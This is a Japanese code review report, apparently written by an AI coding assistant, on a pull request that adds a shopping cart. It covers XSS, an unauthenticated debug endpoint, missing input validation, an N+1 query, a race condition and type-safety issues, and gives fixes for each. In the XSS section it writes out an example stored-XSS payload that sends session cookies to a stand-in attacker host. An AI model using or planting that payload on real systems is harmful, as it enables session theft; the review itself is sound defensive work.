# コードレビュー報告: PR #247 ショッピングカート機能

レビュー実施: Claude Code
対象: src/cart/ (types.ts, cart-service.ts, cart-router.ts) + src/components/CartItemCard.tsx
検出: 12件 (Critical 4 / Warning 3 / Info 5)


## セキュリティ

### [Critical] XSS脆弱性 -- ユーザー入力の未サニタイズ描画 (CWE-79)

ファイル: `src/components/CartItemCard.tsx` 36-39行目

```tsx
{item.note && (
  <div
    className="cart-item-note"
    dangerouslySetInnerHTML={{ __html: item.note }}
  />
)}
```

`item.note` はユーザーが自由に入力できるフィールド。`dangerouslySetInnerHTML` で直接描画しているため、攻撃者が `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` を note に仕込めば、他ユーザーのブラウザ上でセッションCookie窃取やDOM操作が可能になる。Stored XSSであり、一度保存されれば当該カートを参照するすべてのセッションで発火する。

修正案:

```tsx
// 方法1: テキストとしてそのまま描画（推奨）
{item.note && (
  <p className="cart-item-note">{item.note}</p>
)}

// 方法2: リッチテキストが業務要件なら DOMPurify でサニタイズ
import DOMPurify from 'dompurify'

{item.note && (
  <div
    className="cart-item-note"
    dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(item.note) }}
  />
)}
```


### [Critical] 認証バイパス -- デバッグエンドポイントの残留 (CWE-489)

ファイル: `src/cart/cart-router.ts` 37-40行目

```typescript
router.get('/cart/debug', async (req, res) => {
  const allCarts = await prisma.cart.findMany({ include: { items: true } })
  res.json(allCarts)
})
```

認証チェックなしで全ユーザーのカートデータを返すデバッグエンドポイントが本番コードに残っている。`prisma` のimport自体もこのファイルに存在せず、仮にimportを追加して動作した場合、全顧客の購買情報が `/cart/debug` をGETするだけで漏洩する。加えてデータ量に上限がないため、レコード数次第でOOM（メモリ枯渇）やDB負荷急騰を引き起こす。

修正案: このエンドポイントを削除する。開発時にどうしても必要なら環境変数ガードと認証を両方かける。

```typescript
// 本番コードからは削除が正解
// 開発限定で残す場合でも認証+環境変数ガードを両方かける
if (process.env.NODE_ENV === 'development') {
  router.get('/cart/debug', requireAdmin, async (req, res) => {
    const allCarts = await prisma.cart.findMany({
      include: { items: true },
      take: 100, // 上限を設ける
    })
    res.json(allCarts)
  })
}
```


### [Warning] 入力バリデーション不備 -- リクエストボディの未検証 (CWE-20)

ファイル: `src/cart/cart-router.ts` 6-10行目

```typescript
router.post('/cart/items', async (req, res) => {
  try {
    const userId = req.session.userId
    const result = await addItem(userId, req.body)
    res.json(result)
```

`req.body` をそのまま `addItem` に渡しており、`quantity` が負数・小数・文字列でもPrismaまで到達する。`quantity: -100` で在庫操作を改ざんされる可能性がある。`productId` にも長大文字列やSQLフラグメントを投入される余地がある（Prismaがパラメータ化するため直接のSQLiリスクは低いが、防御の深度が足りない）。

修正案:

```typescript
import { z } from 'zod'

const AddItemSchema = z.object({
  productId: z.string().uuid(),
  quantity: z.number().int().min(1).max(99),
  note: z.string().max(500).optional(),
})

router.post('/cart/items', async (req, res) => {
  try {
    const userId = req.session.userId
    const request = AddItemSchema.parse(req.body)
    const result = await addItem(userId, request)
    res.json(result)
  } catch (error) {
    if (error instanceof z.ZodError) {
      return res.status(400).json({ error: '入力値が不正です', details: error.issues })
    }
    res.status(500).json({ error: 'カートの更新に失敗しました' })
  }
})
```


### [Warning] エラー情報漏洩 -- スタックトレースの潜在的露出 (CWE-209)

ファイル: `src/cart/cart-router.ts` 全エンドポイント

```typescript
} catch (error) {
  res.status(500).json({ error: 'カートの更新に失敗しました' })
}
```

現時点では固定メッセージを返しているためスタックトレースは漏洩していない。だが `error` オブジェクトを今後うっかり `res.json({ error })` に変えると、Prismaの接続文字列やテーブル構造が露出する。エラーハンドリングの集約と、本番環境では内部情報を隠蔽する仕組みが欠けている。

修正案: Express のグローバルエラーハンドラに集約する。

```typescript
// src/middleware/error-handler.ts
export function errorHandler(err: Error, req: Request, res: Response, next: NextFunction) {
  console.error(err)
  const message = process.env.NODE_ENV === 'production'
    ? 'Internal Server Error'
    : err.message
  res.status(500).json({ error: message })
}
```


## パフォーマンス

### [Critical] N+1クエリ -- ループ内での商品個別取得 (CWE-400)

ファイル: `src/cart/cart-service.ts` 63-72行目

```typescript
const itemsWithDetails = []
for (const item of cart.items) {
  const product = await prisma.product.findUnique({
    where: { id: item.productId },
  })
  itemsWithDetails.push({
    ...item,
    name: product.name,
    price: product.price,
    imageUrl: product.imageUrl,
  })
}
```

カートにN個の商品があるとき、N回のSQLクエリが発行される。10商品なら10回、100商品なら100回のDBラウンドトリップ。カート表示はページロードのたびに走るため、商品数の増加に比例してレスポンスタイムが直線的に悪化する。DBコネクションプールの枯渇にもつながる。

修正案: Prismaのリレーション include で1クエリに集約する。

```typescript
export async function getCartWithDetails(userId: string) {
  const cart = await prisma.cart.findFirst({
    where: { userId },
    include: {
      items: {
        include: {
          product: {
            select: { name: true, price: true, imageUrl: true },
          },
        },
      },
    },
  })

  if (!cart) return null

  const itemsWithDetails = cart.items.map((item) => ({
    ...item,
    name: item.product.name,
    price: item.product.price,
    imageUrl: item.product.imageUrl,
  }))

  return { ...cart, items: itemsWithDetails }
}
```

これで商品数に関係なく常に1回のJOINクエリで完結する。


### [Info] Null安全でないプロパティアクセス (CWE-476)

ファイル: `src/cart/cart-service.ts` 66-69行目

```typescript
const product = await prisma.product.findUnique({
  where: { id: item.productId },
})
itemsWithDetails.push({
  ...item,
  name: product.name, // product が null なら TypeError
```

`findUnique` は該当レコードがなければ `null` を返す。商品が削除済みの場合に `product.name` で TypeError が発生し、カート全体が表示不能になる。


## 並行性

### [Critical] 競合状態 -- カート同時更新によるデータ消失 (CWE-362)

ファイル: `src/cart/cart-service.ts` 7-51行目

`addItem` の処理フロー:
1. カートを読み取る（SELECT）
2. 既存アイテムを検索する（アプリケーション側のfind）
3. 数量を加算して更新する（UPDATE）

この read-then-write パターンはTOCTOU（Time-of-check to time-of-use）競合の典型。ユーザーがブラウザの複数タブから同時にカートへ追加した場合:

```
タブA: SELECT cart (quantity=1)
タブB: SELECT cart (quantity=1)
タブA: UPDATE quantity=1+1=2
タブB: UPDATE quantity=1+1=2  ← タブAの加算が消失（Lost Update）
```

本来 quantity=3 になるべきところが quantity=2 になる。

修正案: Prismaトランザクション + アトミック演算で解決する。

```typescript
export async function addItemToCart(userId: string, request: AddItemRequest) {
  return await prisma.$transaction(async (tx) => {
    const cart = await tx.cart.findFirst({
      where: { userId },
      include: { items: true },
    })

    if (!cart) {
      return await tx.cart.create({
        data: {
          userId,
          items: {
            create: {
              productId: request.productId,
              quantity: request.quantity,
              note: request.note,
            },
          },
        },
        include: { items: true },
      })
    }

    const existingItem = cart.items.find(
      (item) => item.productId === request.productId
    )

    if (existingItem) {
      // increment はPrismaのアトミック操作。read-then-writeを回避する
      await tx.cartItem.update({
        where: { id: existingItem.id },
        data: { quantity: { increment: request.quantity } },
      })
    } else {
      await tx.cartItem.create({
        data: {
          cartId: cart.id,
          productId: request.productId,
          quantity: request.quantity,
          note: request.note,
        },
      })
    }

    return await tx.cart.findFirst({
      where: { userId },
      include: { items: true },
    })
  })
}
```

`quantity: { increment: request.quantity }` がポイント。これはSQL上 `SET quantity = quantity + $1` に変換され、read-then-writeではなくDB側でアトミックに加算される。


## 型安全性

### [Warning] any型の乱用 -- 4箇所で型チェック無効化 (CWE-1287)

ファイル: `src/cart/cart-service.ts`

| 行 | コード | 問題 |
|----|--------|------|
| 31 | `(item: any) => item.productId` | CartItem型が使える |
| 78 | `calculateSummary(items: any[])` | 引数に適切な型がない |
| 80 | `(sum: any, item: any)` | reduceのアキュムレータと要素が両方any |
| 88 | `(i: any) => i.productId` | 31行目と同じ |

`any` はTypeScriptの型チェックを完全に無効化する。フィールド名のtypoやプロパティ追加・削除がコンパイル時に検出されなくなるため、本番ランタイムまでバグが潜伏する。Prismaが生成する型をそのまま使えば解決する。

修正案:

```typescript
import { CartItem as PrismaCartItem } from '@prisma/client'

interface CartItemWithPrice {
  price: number
  quantity: number
}

export function calculateSummary(items: CartItemWithPrice[]): CartSummary {
  const subtotal = items.reduce((sum, item) => sum + item.price * item.quantity, 0)
  const tax = Math.round(subtotal * TAX_RATE)
  return {
    totalItems: items.reduce((sum, item) => sum + item.quantity, 0),
    subtotal,
    tax,
    total: subtotal + tax,
  }
}

// find のコールバックも型付け
const existingItem = cart.items.find(
  (item: PrismaCartItem) => item.productId === request.productId
)
```


## 保守性

### [Info] デッドコード -- 未使用の formatCurrency 関数

ファイル: `src/cart/cart-service.ts` 98-100行目

```typescript
function formatCurrency(amount: number): string {
  return `¥${amount.toLocaleString()}`
}
```

ファイル内のどこからも呼ばれず、exportもされていない。フロントエンド側で `toLocaleString()` を直接使っている（CartItemCard.tsx 41行目）。lint の no-unused-vars で検出できるはずだが、ESLint設定が甘い可能性がある。削除すべき。


### [Info] 命名の改善

ファイル: `src/cart/cart-service.ts`

- `addItem` -> `addItemToCart`: 他モジュールからimportされたとき、何に対する操作か自明になる
- `removeItem` -> `removeItemFromCart`: 同上

cart-service.ts 内にいる限りは文脈で分かるが、`import { addItem } from './cart-service'` と書かれた呼び出し側では意味が曖昧になる。


### [Info] null チェックの欠落 (CWE-476)

ファイル: `src/cart/cart-service.ts` 86-88行目

```typescript
const cart = await prisma.cart.findFirst({ ... })
const item = cart.items.find(...)  // cart が null なら TypeError
```

`addItem` では cart の null チェックをしているのに `removeItem` では省略されている。同一ファイル内でガード条件が不統一だと、後から読む開発者が混乱する。

修正案:

```typescript
export async function removeItemFromCart(userId: string, productId: string) {
  const cart = await prisma.cart.findFirst({
    where: { userId },
    include: { items: true },
  })

  if (!cart) {
    throw new Error('カートが見つかりません')
  }

  const item = cart.items.find(
    (i: PrismaCartItem) => i.productId === productId
  )
  if (!item) {
    throw new Error('指定された商品がカートに存在しません')
  }

  await prisma.cartItem.delete({ where: { id: item.id } })

  return await prisma.cart.findFirst({
    where: { userId },
    include: { items: true },
  })
}
```


### [Info] マジックナンバー

ファイル: `src/components/CartItemCard.tsx` 24行目

```typescript
if (newQuantity > 99) return
```

99がビジネスロジック上の上限なのかUI制約なのか判別できない。定数に抽出し、サーバー側のバリデーションとも値を揃えるべき。

```typescript
const MAX_ITEM_QUANTITY = 99

if (newQuantity > MAX_ITEM_QUANTITY) return
```


## 検出サマリー

| 重要度 | 件数 | 内訳 |
|--------|------|------|
| Critical | 4 | XSS (CWE-79), デバッグエンドポイント (CWE-489), N+1クエリ (CWE-400), 競合状態 (CWE-362) |
| Warning | 3 | 入力バリデーション不備 (CWE-20), エラー情報漏洩 (CWE-209), any型乱用 (CWE-1287) |
| Info | 5 | デッドコード, Nullアクセス (CWE-476) x2, 命名改善, マジックナンバー |

Critical 4件は本番デプロイ前に修正必須。XSSはStored型で攻撃コストが低く被害範囲が広い。競合状態はカートデータの消失でCV率を直接毀損する。N+1はカート商品数に比例してレスポンスが劣化し、ピーク時にDB接続を食い尽くす。デバッグエンドポイントは全顧客の購買データ漏洩に直結する。

Warning 3件はマージ前に対応を推奨。入力バリデーションは quantity=-100 で在庫操作を改ざんされるリスクがあり、CWE-20は OWASP Top 10 の常連。

Info 5件は次回スプリントでの改善で問題ない。ただしnullチェックの不統一は放置するとコピペで増殖するため早めに直したい。
